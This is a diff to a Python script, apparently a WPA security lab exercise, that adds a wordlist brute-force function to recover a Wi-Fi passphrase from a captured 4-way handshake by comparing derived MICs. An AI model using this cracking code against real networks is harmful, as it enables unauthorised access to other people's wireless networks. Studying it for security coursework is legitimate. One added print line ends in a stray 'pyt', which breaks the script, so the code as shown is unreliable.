@@ -134,35 +134,36 @@ def keyDerivation(passphrase, ssid, ap_mac, sta_mac, ANonce, SNonce, data, hmac_
 
     return pmk, ptk, mic
 
+def bruteForceMIC(ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo, mic_to_test):
+    '''
+    Try to found a WPA passphrase from a 4-Way Handshake and a word list
+    '''
+    dico = open('liste_francais.txt', 'r')
+    for line in dico.readlines():
+        for word in line.split():
+            pmk, ptk, mic = keyDerivation(word, ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo)
+            if (mic.hexdigest()[0:32] == mic_to_test):
+                return word
+    return None
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap")
 
 ssid, APmac, Clientmac = catchAssociationRequest(wpa)
 ANonce, SNonce, mic_to_test, hmac_algo, data = catch4WayHandshake(APmac, Clientmac, wpa)
+passphrase = bruteForceMIC(ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo, mic_to_test)
 
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
-
-pmk, ptk, mic = keyDerivation(passPhrase, ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo)
 
 print ("\nValues used to derivate keys")
 print ("============================")
-print ("Passphrase:\t",passPhrase)
 print ("SSID:\t\t",ssid)
 print ("AP Mac:\t\t",b2a_hex(APmac))
 print ("Client Mac:\t",b2a_hex(Clientmac))
 print ("AP Nonce:\t",b2a_hex(ANonce))
-print ("Client Nonce:\t",b2a_hex(SNonce))
+print ("Client Nonce:\t",b2a_hex(SNonce))pyt
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t",pmk.hex())
-print ("PTK:\t",ptk.hex())
-print ("KCK:\t",ptk[0:16].hex())
-print ("KEK:\t",ptk[16:32].hex())
-print ("TK:\t",ptk[32:48].hex())
-print ("MICK:\t",ptk[48:64].hex())
-print ("MIC:\t",mic.hexdigest()[0:32], "\n")
+print ("\nBrute force attack")
+print ("============================")
+print ("Passphrase:\t", passphrase, "\n")
 
 
